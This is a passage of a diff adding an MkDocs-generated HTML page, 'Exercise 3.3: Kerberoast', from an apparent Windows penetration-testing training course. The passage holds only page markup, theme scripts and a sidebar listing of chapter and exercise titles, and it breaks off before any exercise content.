@@ -1,0 +1,3579 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Windows penetration testing exercises for OpenCyberRange">
+      
+      
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.2">
+    
+    
+      
+        <title>Exercise 3.3: Kerberoast - Windows Penetration Testing</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css?v=4">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="blue" data-md-color-accent="blue">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#exercise-33-kerberoast" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Windows Penetration Testing" class="md-header__button md-logo" aria-label="Windows Penetration Testing" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Windows Penetration Testing
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Exercise 3.3: Kerberoast
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="blue" data-md-color-accent="blue"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="blue"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Windows Penetration Testing" class="md-nav__button md-logo" aria-label="Windows Penetration Testing" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Windows Penetration Testing
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH01 -- Enumeration
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH01 -- Enumeration
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH01_Enumeration/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH01_Enumeration/01_Basic_Port_Scan/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.1 -- Basic Port Scan
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH01_Enumeration/02_Multiple_Port_Discovery/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.2 -- Multiple Port Discovery
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH01_Enumeration/03_Service_Version_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.3 -- Service Version Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH01_Enumeration/04_OS_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.4 -- OS Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH01_Enumeration/05_Comprehensive_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 1.5 -- Comprehensive Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH01_Enumeration/06_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH02 -- SMB Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH02 -- SMB Reconnaissance
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH02_SMB_Reconnaissance/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH02_SMB_Reconnaissance/01_Connection_Test/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.1 -- Connection Test
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH02_SMB_Reconnaissance/02_Share_Listing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.2 -- Share Listing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH02_SMB_Reconnaissance/03_Anonymous_Share_Access/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.3 -- Anonymous Share Access
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH02_SMB_Reconnaissance/04_File_Retrieval/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.4 -- File Retrieval
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH02_SMB_Reconnaissance/05_Null_Session_Connection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.5 -- Null Session Connection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH02_SMB_Reconnaissance/06_Null_Session_Share_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.6 -- Null Session Share Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH02_SMB_Reconnaissance/07_User_Enumeration_via_Null_Session/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.7 -- User Enumeration via Null Session
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH02_SMB_Reconnaissance/08_Comprehensive_Null_Session_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 2.8 -- Comprehensive Null Session Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH02_SMB_Reconnaissance/09_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH03 -- SMB Credential Attacks
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH03 -- SMB Credential Attacks
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH03_SMB_Credential_Attacks/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH03_SMB_Credential_Attacks/01_Manual_Credential_Test/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.1 -- Manual Credential Test
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH03_SMB_Credential_Attacks/02_Multiple_Credential_Testing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.2 -- Multiple Credential Testing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH03_SMB_Credential_Attacks/03_Single_User_Brute_Force/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.3 -- Single User Brute Force
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH03_SMB_Credential_Attacks/04_Username_Enumeration_and_Brute_Force/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.4 -- Username Enumeration and Brute Force
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH03_SMB_Credential_Attacks/05_Full_Credential_Attack/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 3.5 -- Full Credential Attack
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH03_SMB_Credential_Attacks/06_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH04 -- RDP Exploitation
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH04 -- RDP Exploitation
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH04_RDP_Exploitation/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH04_RDP_Exploitation/01_RDP_Service_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 4.1 -- RDP Service Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH04_RDP_Exploitation/02_RDP_Version_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 4.2 -- RDP Version Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH04_RDP_Exploitation/03_RDP_Manual_Connection_Test/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 4.3 -- RDP Manual Connection Test
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH04_RDP_Exploitation/04_RDP_Credential_Guessing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 4.4 -- RDP Credential Guessing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH04_RDP_Exploitation/05_RDP_Brute_Force_Attack/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 4.5 -- RDP Brute Force Attack
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH04_RDP_Exploitation/06_RDP_Session_Access_and_Flag_Retrieval/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 4.6 -- RDP Session Access and Flag Retrieval
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH04_RDP_Exploitation/07_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH05 -- WinRM Exploitation
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH05 -- WinRM Exploitation
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH05_WinRM_Exploitation/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH05_WinRM_Exploitation/01_WinRM_Service_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 5.1 -- WinRM Service Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH05_WinRM_Exploitation/02_WinRM_Version_Configuration_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 5.2 -- WinRM Version and Configuration Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH05_WinRM_Exploitation/03_WinRM_Manual_Authentication/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 5.3 -- WinRM Manual Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH05_WinRM_Exploitation/04_WinRM_Credential_Brute_Force/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 5.4 -- WinRM Credential Brute Force
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH05_WinRM_Exploitation/05_WinRM_Command_Execution/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 5.5 -- WinRM Command Execution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH05_WinRM_Exploitation/06_WinRM_File_Retrieval/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 5.6 -- WinRM File Retrieval
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH05_WinRM_Exploitation/07_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH06 -- MSSQL Exploitation
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH06 -- MSSQL Exploitation
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH06_MSSQL_Exploitation/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH06_MSSQL_Exploitation/01_MSSQL_Service_Detection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 6.1 -- MS-SQL Service Detection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH06_MSSQL_Exploitation/02_MSSQL_Version_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise 6.2 -- MS-SQL Version and Instance Enumeration
+  
+
+    
+  </span>
+  
+  
+
